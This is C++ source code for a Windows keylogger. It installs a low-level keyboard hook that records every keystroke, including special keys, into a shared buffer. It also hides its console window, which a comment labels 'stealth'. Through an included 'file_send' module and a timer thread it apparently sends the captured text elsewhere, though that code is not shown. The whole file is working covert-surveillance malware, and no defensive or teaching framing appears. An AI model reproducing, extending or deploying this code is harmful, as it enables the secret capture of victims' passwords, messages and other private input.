#define _WIN32_WINNT 0x0500
#include <fstream>

#include "file_send.cpp"
#include "timer.cpp"

#include <windows.h>

using namespace std;

extern int counter;
extern std::mutex mtx;
extern string buffer;

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

    // If key is being pressed
    if (wParam == WM_KEYDOWN)
    {
        mtx.lock();
        switch (p->vkCode)
        {
        // Invisible keys
         case VK_CAPITAL:
            if((GetKeyState(VK_CAPITAL) & 0x0001) != 0){
                buffer += "<CAPDOWN>";
            }
            else{
                buffer += "<CAPON>";
            }
            break;
        case VK_LSHIFT:  
            buffer += "<SHIFT>";
            break;
        case VK_LCONTROL:
            buffer += "<LCTRL>";
            break;
        case VK_RCONTROL:
            buffer += "<RCTRL>";
            break;
        case VK_INSERT:
            buffer += "<INSERT>";
            break;
        case VK_END:
            buffer +=  "<END>";
            break;
        case VK_PRINT:
            buffer += "<PRINT>";
            break;
        case VK_DELETE:
            buffer += "<DEL>";
            break;
        case VK_BACK:
            buffer += "<BK>";
            break;
        case VK_LEFT:
            buffer += "<LEFTARROW>";
            break;
        case VK_RIGHT:
            buffer += "<RIGHTARROW>";
            break;
        case VK_UP:
            buffer += "<UPARROW>";
            break;
        case VK_DOWN:
            buffer += "<DOWNARROW>";
            break;
        case VK_HOME:
            buffer += "<HOME>";
            break;
        case VK_TAB:
            buffer +=  "<TAB>";
            break;
        case VK_LWIN:
            buffer +=  "<WINDOWS>";
            break;
        case VK_F1:
            buffer +=  "<F1>";
            break;
        case VK_F2:
            buffer +=  "<F2>";
            break;
        case VK_F3:
            buffer +=  "<F3>";
            break;
        case VK_F4:
            buffer += "<F4>";
            break;
        case VK_F5:
            buffer +=  "<F5>";
            break;
        case VK_F6:
            buffer += "<F6>";
            break;
        case VK_F7:
            buffer +=  "<F7>";
            break;
        case VK_F8:
            buffer +=  "<F8>";
            break;
        case VK_F9:
            buffer +=  "<F9>";
            break;
        case VK_F10:
            buffer += "<F10>";
            break;
        case VK_F11:
            buffer +=  "<F11>";
            break;
        case VK_F12:
            buffer += "<F12>";
            break;
        case VK_ESCAPE:
            buffer +=  "<ESCAPE>";
            break;
        case VK_MENU:
            buffer +=  "<ALT>";
            break;
        case 13:
            buffer += "<ENTER>";
            break;
        // Visible keys
        default:
            buffer += char(tolower(p->vkCode));
        }
        mtx.unlock();
    }


    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{

    HWND stealth; /*creating stealth (window is not visible)*/
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    std::thread th(tick);
    
    // Set windows hook
    HHOOK keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        keyboardHookProc,
        hInstance,
        0);

    MSG messages;

    while (GetMessage(&messages, NULL, 0, 0))
    {
        /* Translate virtual-key messages into character messages */
        TranslateMessage(&messages);
        /* Send message to WindowProcedure */
        DispatchMessage(&messages);
    }

    return 0;
}